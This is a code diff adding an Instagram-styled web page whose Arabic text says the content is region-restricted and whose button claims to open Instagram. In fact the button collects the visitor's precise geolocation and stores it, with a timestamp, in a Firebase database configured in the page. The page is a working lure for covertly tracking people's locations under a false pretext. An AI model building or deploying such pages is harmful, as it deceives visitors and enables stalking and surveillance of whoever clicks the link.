@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enable Location</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-app-compat.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-database-compat.min.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDRPS23BZEohqMZkica2DD1rGCaPz02Ko4",
+      authDomain: "inde-17336.firebaseapp.com",
+      databaseURL: "https://inde-17336-default-rtdb.firebaseio.com",
+      projectId: "inde-17336",
+      storageBucket: "inde-17336.firebasestorage.app",
+      messagingSenderId: "231638777590",
+      appId: "1:231638777590:web:651abc4b50880634c976d7",
+      measurementId: "G-Q8X44VSFT3"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    window.getLocationAndSave = function () {
+      const output = document.getElementById("output");
+      const button = document.querySelector('.location-btn');
+      
+      // Add loading state
+      button.innerHTML = '<div class="spinner"></div> جاري التحديد...';
+      button.disabled = true;
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const locRef = db.ref('locations').push();
+          locRef.set({
+            latitude: lat,
+            longitude: lon,
+            timestamp: new Date().toISOString()
+          }).then(() => {
+            output.innerHTML = `
+              <div class="success-card">
+                <div class="success-icon">✅</div>
+                <h3>تم حفظ الموقع بنجاح!</h3>
+                <div class="coordinates">
+                  <div class="coord-item">
+                    <span class="coord-label">Latitude:</span>
+                    <span class="coord-value">${lat.toFixed(6)}</span>
+                  </div>
+                  <div class="coord-item">
+                    <span class="coord-label">Longitude:</span>
+                    <span class="coord-value">${lon.toFixed(6)}</span>
+                  </div>
+                </div>
+              </div>
+            `;
+          }).catch(error => {
+            output.innerHTML = `
+              <div class="error-card">
+                <div class="error-icon">❌</div>
+                <h3>خطأ في حفظ البيانات</h3>
+                <p>${error.message}</p>
+              </div>
+            `;
+          });
+          
+          // Reset button
+          button.innerHTML = '📍 تفعيل الموقع';
+          button.disabled = false;
+        }, error => {
+          output.innerHTML = `
+            <div class="error-card">
+              <div class="error-icon">❌</div>
+              <h3>خطأ في جلب الموقع</h3>
+              <p>${error.message}</p>
+            </div>
+          `;
+          
+          // Reset button
+          button.innerHTML = '📍 إعادة المحاولة';
+          button.disabled = false;
+        });
+      } else {
+        output.innerHTML = `
+          <div class="error-card">
+            <div class="error-icon">❌</div>
+            <h3>غير مدعوم</h3>
+            <p>المتصفح لا يدعم تحديد الموقع الجغرافي</p>
+          </div>
+        `;
+        
+        // Reset button
+        button.innerHTML = '📍 تفعيل الموقع';
+        button.disabled = false;
+      }
+    };
+  </script>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #262626;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d, #f56040, #f77737, #fcaf45, #ffdc80);
+    }
+
+    .icon-wrapper {
+      margin-bottom: 30px;
+      position: relative;
+    }
+
+    .location-icon {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      background: linear-gradient(135deg, #405de6, #833ab4);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 35px;
+      color: white;
+      box-shadow: 0 10px 25px rgba(64, 93, 230, 0.3);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #262626;
+      margin-bottom: 15px;
+      letter-spacing: -0.5px;
+    }
+
+    .message {
+      font-size: 16px;
+      color: #8e8e8e;
+      line-height: 1.5;
+      margin-bottom: 35px;
+      font-weight: 400;
+    }
+
+    .location-btn {
+      background: linear-gradient(45deg, #405de6, #5851db, #833ab4);
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(64, 93, 230, 0.3);
+      min-width: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 0 auto;
+    }
+
+    .location-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 25px rgba(64, 93, 230, 0.4);
+    }
+
+    .location-btn:active {
+      transform: translateY(0);
+    }
+
+    .location-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-top: 2px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #output {
+      margin-top: 30px;
+    }
+
+    .success-card, .error-card {
+      background: #f8f9fa;
+      border-radius: 15px;
+      padding: 25px;
+      margin-top: 20px;
+      border-left: 4px solid #28a745;
+    }
+
+    .error-card {
+      border-left-color: #dc3545;
+    }
+
+    .success-icon, .error-icon {
+      font-size: 40px;
+      margin-bottom: 15px;
+    }
+
+    .success-card h3, .error-card h3 {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      color: #262626;
+    }
+
+    .coordinates {
+      text-align: left;
+      margin-top: 15px;
+    }
+
+    .coord-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .coord-item:last-child {
+      border-bottom: none;
+    }
+
+    .coord-label {
+      font-weight: 600;
+      color: #8e8e8e;
+      font-size: 14px;
+    }
+
+    .coord-value {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      color: #262626;
+      font-size: 14px;
+    }
+
+    .error-card p {
+      color: #8e8e8e;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+        margin: 10px;
+      }
+      
+      .title {
+        font-size: 20px;
+      }
+      
+      .message {
+        font-size: 14px;
+      }
+      
+      .location-btn {
+        font-size: 14px;
+        padding: 12px 25px;
+        min-width: 180px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="icon-wrapper">
+      <div class="location-icon">📍</div>
+    </div>
+    
+    <h1 class="title">INSTAGRAM: ASHURAYA</h1>
+    
+    <div class="message">
+      هذا المحتوى متاح فقط في بعض الدول.<br>
+       
+    </div>
+
+    <button class="location-btn" onclick="getLocationAndSave()">
+        📱 فتح في إنستقرام
+    </button>
+
+    <div id="output"></div>
+  </div>
+</body>
+</html>
